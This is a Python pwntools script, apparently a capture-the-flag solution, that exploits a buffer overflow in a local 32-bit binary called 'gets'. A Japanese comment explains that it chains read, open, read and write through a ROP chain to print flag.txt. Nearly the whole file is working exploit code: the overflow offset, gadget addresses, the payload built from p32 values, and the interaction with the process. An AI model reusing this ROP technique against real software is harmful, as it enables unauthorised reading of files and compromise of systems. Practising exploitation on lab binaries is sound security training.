# coding: utf-8

# bofを利用してrop chainでflag.txtを読み出して標準出力に出す
# ----------------------------------------
# rop chain
# read(0, bss, 0x10) -> open(bss, 0) -> read(3, bss+0x100, 0x100) -> write(1, bss+0x100, 0x100)
# ----------------------------------------

from pwn import *
import time

e = ELF('./gets')

bof_offset = 28
bss = 0x80e9fe4
fd = 3
pop3ret = 0x0806303b # pop edi ; pop esi ; pop ebx ; ret
pop2ret = 0x08099a0c # pop ebx ; pop edi ; ret

print('bss: 0x%08x' % bss)
print('read: 0x%08x' % e.symbols['read'])
print('open: 0x%08x' % e.symbols['open'])
print('write: 0x%08x' % e.symbols['write'])

p = process('./gets')

# padding to return address
payload = 'A' * bof_offset

# read(0, bss, 10)
payload += p32(e.symbols['read'])
payload += p32(pop3ret)
payload += p32(0x00000000)
payload += p32(bss)
payload += p32(0x00000010)

# open(bss, 0)
payload += p32(e.symbols['open'])
payload += p32(pop2ret)
payload += p32(bss)
payload += p32(0x00000000)

# read(3, bss+0x100, 0x100)
payload += p32(e.symbols['read'])
payload += p32(pop3ret)
payload += p32(fd)
payload += p32(bss + 0x100)
payload += p32(0x00000100)

# write(1, bss+0x100, 0x100)
payload += p32(e.symbols['write'])
payload += p32(pop3ret)
payload += p32(0x00000001)
payload += p32(bss + 0x100)
payload += p32(0x00000100)

p.recvuntil('GIVE ME YOUR NAME!')
p.sendline(payload)

time.sleep(0.2)
p.sendline('flag.txt\x00')

p.interactive()
